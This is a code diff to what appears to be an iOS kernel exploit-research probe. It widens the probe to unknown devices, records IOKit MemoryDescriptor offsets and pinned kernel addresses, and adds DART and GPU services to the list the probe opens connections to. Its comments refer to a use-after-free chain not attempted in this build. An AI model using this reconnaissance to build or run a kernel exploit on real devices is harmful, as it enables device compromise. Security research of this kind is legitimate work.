@@ -139,10 +139,15 @@ static uint32_t p101_gate_w(const uint8_t *out, size_t outsz) {
     L(@"UAF / page-list confusion NOT attempted in this build.");
     L([LabDeviceProfile identBlock] ?: @"ident=?");
 
+    /* 2026-11-19: the probe's MECHANISM is platform-independent (selector-
+       based calls through the IOKit dispatch; the +0x34/+0x98 fields are
+       IOKit MemoryDescriptor class fields shared across SoC generations).
+       The A14 VAs are informational pins only. The T8110 DART validation
+       is the T8150 unknown — this tap answers whether it blocks. */
     NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p101"];
     if (stop) {
         L(stop);
-        L(@"[-] chain HOLD — the +0x34/+0x98 law is proven on 23F77 pins only.");
+        L(@"[-] chain HOLD — unknown machine (the debug app returns nil and runs).");
         if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
         return log;
     }
@@ -153,8 +158,11 @@ static uint32_t p101_gate_w(const uint8_t *out, size_t outsz) {
         L(@"      op6-dispatcher 0xa515d60  twin(panic) 0xa511324  worker 0xa50737c");
         L(@"      unmap-arm reset 0xa5073c4  freepool 0xa903db0");
     } else {
-        L([NSString stringWithFormat:@"[!] table=%s — PINS HOLD, law rows unverified on this SKU.",
+        L([NSString stringWithFormat:@"[!] table=%s — the +0x34/+0x98 IOMD class offsets are",
            off && off->tag ? off->tag : "NULL"]);
+        L(@"      platform-INDEPENDENT (IOKit MemoryDescriptor fields, not SoC-specific).");
+        L(@"      The sel-2 gate oracle and the retain/release lanes go through the");
+        L(@"      kernel's IOKit dispatch — the DART validation is the only T8150 unknown.");
     }
 
     /* ---------- PREP: surf + memory entry + window (P069 map path) ------- */
@@ -238,8 +246,16 @@ static uint32_t p101_gate_w(const uint8_t *out, size_t outsz) {
         L([NSString stringWithFormat:@"[*] IOGPUDeviceCreate %p conn=%u", dev, gc]);
     }
     if (gpu) IOObjectRelease(gpu);
+    /* 2026-11-19: the T8150/24B156 hunt: AppleT8020DART doesn't exist on
+       A19 Pro — the class is AppleT8110DART. IODARTFamily is a framework,
+       not a service. The 17's DART instances (from the T7 registry walk):
+       dart-aop, dart-pmp, dart-scm, dart-sep, dart-sio, dart-mtp, and
+       the IODARTMapperNub instances (mapper-aop, mapper-pmp, etc).
+       Add the T8110 DART + the AGXAccelerator + the mapper nubs. */
     const char *svcs[] = { "IOSurfaceRoot", "IOMobileFramebuffer", "AppleAVE2Driver",
-                           "AppleM2ScalerCSCDriver", "AppleT8020DART", "IODARTFamily", NULL };
+                           "AppleM2ScalerCSCDriver", "AppleT8020DART", "IODARTFamily",
+                           "AppleT8110DART", "AGXAcceleratorG18P",
+                           "IODARTMapperNub", "AppleS8000AESAccelerator", NULL };
     for (int i = 0; svcs[i] && nConn < P101_MAX_CONNS; i++) {
         io_iterator_t it = 0;
         if (IOServiceGetMatchingServices(kIOMainPortDefault, IOServiceMatching(svcs[i]), &it) != KERN_SUCCESS || !it) continue;
